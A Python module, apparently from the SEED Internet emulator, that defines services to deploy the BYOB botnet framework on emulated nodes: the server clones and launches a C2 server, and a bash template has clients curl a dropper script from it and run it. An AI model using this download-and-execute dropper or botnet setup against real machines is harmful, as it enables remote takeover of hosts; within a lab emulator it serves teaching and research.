#!/usr/bin/env python3
# encoding: utf-8
# __author__ = 'Demon'
from __future__ import annotations
from seedemu.core import Node, Service, Server
from typing import Dict

BotnetServerFileTemplates: Dict[str, str] = {}

BotnetServerFileTemplates['client_dropper_runner'] = '''\
#!/bin/bash
url="http://$1:$2/clients/droppers/client.py"
until curl -sHf "$url" -o client.py > /dev/null; do {
    echo "botnet-client: server $1:$2 not ready, waiting..."
    sleep 1
}; done
python3 client.py
'''

BotnetServerFileTemplates['server_init_script'] = '''\
#!/bin/bash
cd /tmp/byob/byob
echo -e 'exit\\ny' | python3 server.py --port $2
python3 client.py --name 'client' $1 $2
'''

class BotnetServer(Server):
    """!
    @brief The BotnetServer class.
    """

    __port: int

    def __init__(self):
        """!
        @brief BotnetServer constructor.
        """
        super().__init__()
        self.__port = 445

    def setPort(self, port: int) -> BotnetServer:
        """!
        @brief Set BYOB port. Default to 445.

        Beside the given port, the follow ports will also be opened:
        port + 1: HTTP server hosting BYOB modules (for client to import)
        port + 2: HTTP server host Python packages (for client to import)
        port + 3: HTTP server for incoming uploads.

        @param port port.

        @returns self, for chaining API calls.
        """
        self.__port = port
        return self

    def install(self, node: Node):
        """!
        @brief Install the Botnet C2 server.
        """
        address = str(node.getInterfaces()[0].getAddress())

        # get dependencies
        node.addSoftware('python3 git cmake python3-dev gcc g++ make python3-pip') 

        # get byob
        node.addBuildCommand('git clone https://github.com/malwaredllc/byob.git /tmp/byob/')

        # get byob dependencies
        node.addBuildCommand('pip3 install -r /tmp/byob/byob/requirements.txt')

        # add the init script to server
        node.setFile('/server_init_script', BotnetServerFileTemplates['server_init_script'])
        node.appendStartCommand('chmod +x /server_init_script')

        # start the server & make dropper/stager/payload
        node.appendStartCommand('/server_init_script "{}" "{}"'.format(address, self.__port))

    def print(self, indent: int) -> str:
        out = ' ' * indent
        out += 'BotnetServer'

        return out

class BotnetClientServer(Server):
    """!
    @brief The BotnetClientServer class.
    """

    __server: str
    __port: int

    def __init__(self):
        """!
        @brief BotnetClient constructor.
        """
        super().__init__()
        self.__server = None
        self.__port = 446

    def setServer(self, server: str, port: int = 446) -> BotnetClientServer:
        """!
        @brief BotnetClient constructor.

        @param server BYOB server address.
        @param port (optional) control server BYOB modules port. Note that this
        is NOT the BYOB port, but the port for HTTP server hosting BYOB modules.
        It will be your BYOB port plus one. Default to 446 since defualt BYOB
        port is 445.

        @returns self, for chaining API calls.
        """
        self.__server = server
        self.__port = port

        return self

    def install(self, node: Node):
        assert self.__server != None, 'botnet-client on as{}/{} has no server configured!'.format(node.getAsn(), node.getName())

        # get dependencies
        node.addSoftware('python3 git cmake python3-dev gcc g++ make python3-pip') 

        # get byob
        node.addBuildCommand('curl https://raw.githubusercontent.com/malwaredllc/byob/master/byob/requirements.txt > /tmp/byob-requirements.txt')

        # get byob dependencies
        node.addBuildCommand('pip3 install -r /tmp/byob-requirements.txt')

        # script to get dropper from server.
        node.setFile('/client_dropper_runner', BotnetServerFileTemplates['client_dropper_runner'])
        node.appendStartCommand('chmod +x /client_dropper_runner')

        # get and run dropper from server.
        node.appendStartCommand('/client_dropper_runner "{}" "{}"'.format(self.__server, self.__port))

    def print(self, indent: int) -> str:
        out = ' ' * indent
        out += 'BotnetClient'

        return out

class BotnetService(Service):
    """!
    @brief Botnet C2 server service.
    """

    def __init__(self):
        """!
        @brief BotnetService constructor.
        """
        super().__init__()
        self.addDependency('Base', False, False)

    def _createServer(self) -> Server:
        return BotnetServer()

    def getName(self) -> str:
        return 'BotnetService'

    def print(self, indent: int) -> str:
        out = ' ' * indent
        out += 'BotnetServiceLayer\n'

class BotnetClientService(Service):
    """!
    @brief Botnet client service.
    """

    def __init__(self):
        """!
        @brief BotnetService constructor.
        """
        super().__init__()
        self.addDependency('Base', False, False)

    def _createServer(self) -> Server:
        return BotnetClientServer()

    def getName(self) -> str:
        return 'BotnetClientService'

    def print(self, indent: int) -> str:
        out = ' ' * indent
        out += 'BotnetClientServiceLayer\n'